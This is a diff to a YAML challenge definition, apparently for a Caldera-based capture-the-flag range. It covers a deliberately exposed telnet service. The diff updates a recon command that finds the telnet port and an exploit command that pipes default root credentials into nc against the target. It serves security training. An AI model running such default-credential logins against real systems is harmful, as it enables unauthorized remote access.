@@ -3,6 +3,7 @@ name: Telnet Service Enabled
 description: The telnetd service is installed and running, exposing an unencrypted remote login interface on port 23. All credentials and session data are transmitted in cleartext.
 type: vulnerability
 difficulty: easy
+supported_bases: [ubuntu_24_server]
 points: 100
 category: network
 tags: [network, telnet, cleartext, services]
@@ -23,13 +24,23 @@ caldera:
     attack_id: T1133
     name: "External Remote Services"
   recon:
-    description: "Check if telnet is listening on port 23"
+    description: "Discover the listening telnet port"
+    parser:
+      - module: plugins.ctf-exploit.app.parsers.ctf_extract
+        mappings:
+          - source: ctf.vuln.open_telnet
+            custom_parser_vals:
+              marker: VULNERABLE
+              pattern: "port=(\\d+)"
     command: |
-      ss -tlnp | grep -q ":23" && echo "VULNERABLE: telnet is listening on port 23" || echo "SECURE: port 23 is not listening"
+      PORT=$(ss -tlnp 2>/dev/null | grep -E ':23\b' | grep -oP ':(\d+)\b' | head -1 | tr -d ':')
+      [ -n "$PORT" ] && echo "VULNERABLE port=$PORT" || echo "SECURE: port 23 is not listening"
   exploit:
-    description: "Connect to telnet and attempt login with default credentials"
+    description: "Connect to the discovered telnet port and attempt login with default credentials"
     command: |
-      timeout 5 bash -c 'echo -e "root\nchangeme123\n" | nc -q 3 localhost 23' 2>/dev/null | head -10 || echo "Telnet port is open (connect manually for interactive login)"
+      PORT="#{ctf.vuln.open_telnet}"
+      (printf 'root\nchangeme123\n' | timeout 5 nc -q 3 #{ctf.ip} "${PORT}") 2>/dev/null | head -10 \
+        || echo "Telnet open on #{ctf.ip}:${PORT} (connect manually for interactive login)"
 
 references:
   - title: "Ubuntu Server security documentation"
